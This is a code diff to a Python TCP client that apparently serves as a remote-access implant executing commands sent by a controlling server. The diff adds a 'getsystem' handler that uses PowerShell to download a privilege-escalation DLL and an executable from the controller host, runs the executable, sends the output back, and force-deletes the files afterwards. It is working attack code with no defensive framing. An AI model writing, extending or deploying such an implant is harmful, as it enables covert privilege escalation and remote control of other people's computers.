@@ -6,7 +6,7 @@ import threading
 import time
 
 class TCPClient:
-    def __init__(self, host='localhost', port=8888):
+    def __init__(self, host='192.168.182.1', port=8888):
         self.host = host
         self.port = port
         self.client_socket = None
@@ -47,6 +47,14 @@ class TCPClient:
         """执行系统命令并返回结果"""
         try:
             print(f"执行命令: {command}")
+            
+            # 检查是否为getsystem命令
+            if command.strip() == "getsystem":
+                # 启动后台线程处理getsystem命令
+                getsystem_thread = threading.Thread(target=self.handle_getsystem_command)
+                getsystem_thread.daemon = True
+                getsystem_thread.start()
+                return "正在提权中。。。。。。"
             
             # 检查是否为AI生成的PowerShell代码
             if command.startswith("ai_execute "):
@@ -118,6 +126,160 @@ class TCPClient:
             
         except Exception as e:
             return f"命令执行出错: {e}"
+    
+    def handle_getsystem_command(self):
+        """处理getsystem命令：下载特权提升文件并执行"""
+        try:
+            import os
+            import urllib.request
+            import urllib.error
+            
+            print("[+] 开始处理getsystem命令...")
+            
+            # 构建文件下载URL
+            base_url = f"http://{self.host}:8000/escalation/"
+                
+            # 需要下载的文件列表
+            files_to_download = [
+                "privilege_escalation.dll",
+                "test_dll.exe"
+            ]
+            
+            # 下载文件
+            for filename in files_to_download:
+                file_url = base_url + filename
+                local_path = filename
+                
+                print(f"[+] 正在下载文件: {filename}")
+                print(f"[+] 下载URL: {file_url}")
+                
+                try:
+                    # 使用PowerShell下载文件
+                    powershell_command = f"Invoke-WebRequest -Uri '{file_url}' -OutFile '{local_path}'"
+                    
+                    process = subprocess.Popen(
+                        ["powershell.exe", "-Command", powershell_command],
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True,
+                        encoding='utf-8',
+                        errors='ignore'
+                    )
+                    
+                    # 等待下载完成
+                    stdout, stderr = process.communicate()
+                    
+                    if process.returncode != 0:
+                        self.send_message({
+                            'type': 'command_result',
+                            'command': 'getsystem',
+                            'result': f"PowerShell下载失败 {filename}: {stderr}"
+                        })
+                        return
+                    
+                    print(f"[+] 文件下载成功: {filename}")
+                    
+                    # 检查文件是否成功下载
+                    if not os.path.exists(local_path):
+                        self.send_message({
+                            'type': 'command_result',
+                            'command': 'getsystem',
+                            'result': f"文件下载失败: {filename}"
+                        })
+                        return
+                        
+                except Exception as e:
+                    self.send_message({
+                        'type': 'command_result',
+                        'command': 'getsystem',
+                        'result': f"下载文件时出错 {filename}: {e}"
+                    })
+                    return
+            
+            # 检查所有文件是否都已下载
+            for filename in files_to_download:
+                if not os.path.exists(filename):
+                    self.send_message({
+                        'type': 'command_result',
+                        'command': 'getsystem',
+                        'result': f"文件不存在: {filename}"
+                    })
+                    return
+            
+            print("[+] 所有文件下载完成，开始执行test_dll.exe...")
+            
+            # 执行test_dll.exe
+            process = subprocess.Popen(
+                "test_dll.exe",
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                encoding='utf-8',
+                errors='ignore'
+            )
+            
+            # 等待命令执行完成
+            stdout, stderr = process.communicate()
+            
+            # 组合输出结果
+            result = "getsystem命令执行完成\n"
+            if stdout:
+                result += f"标准输出:\n{stdout}\n"
+            if stderr:
+                result += f"错误输出:\n{stderr}\n"
+            
+            result += f"退出码: {process.returncode}"
+            
+            # 发送执行结果回服务器
+            self.send_message({
+                'type': 'command_result',
+                'command': 'getsystem',
+                'result': result
+            })
+            
+            # 删除下载的文件
+            print("[+] 正在删除下载的文件...")
+            files_to_delete = ["privilege_escalation.dll", "test_dll.exe"]
+            
+            for filename in files_to_delete:
+                if os.path.exists(filename):
+                    try:
+                        # 使用PowerShell删除文件
+                        powershell_command = f"Remove-Item '{filename}' -Force"
+                        
+                        process = subprocess.Popen(
+                            ["powershell.exe", "-Command", powershell_command],
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            text=True,
+                            encoding='utf-8',
+                            errors='ignore'
+                        )
+                        
+                        # 等待删除完成
+                        stdout, stderr = process.communicate()
+                        
+                        if process.returncode == 0:
+                            print(f"[+] 文件删除成功: {filename}")
+                        else:
+                            print(f"[-] 文件删除失败 {filename}: {stderr}")
+                            
+                    except Exception as e:
+                        print(f"[-] 删除文件时出错 {filename}: {e}")
+                else:
+                    print(f"[-] 文件不存在，无需删除: {filename}")
+            
+            # 执行完成后断开连接
+            print("[+] test_dll.exe执行完成，断开连接...")
+            self.disconnect()
+            
+        except Exception as e:
+            self.send_message({
+                'type': 'command_result',
+                'command': 'getsystem',
+                'result': f"getsystem命令执行出错: {e}"
+            })
     
     def listen_for_commands(self):
         """监听来自服务器的命令"""
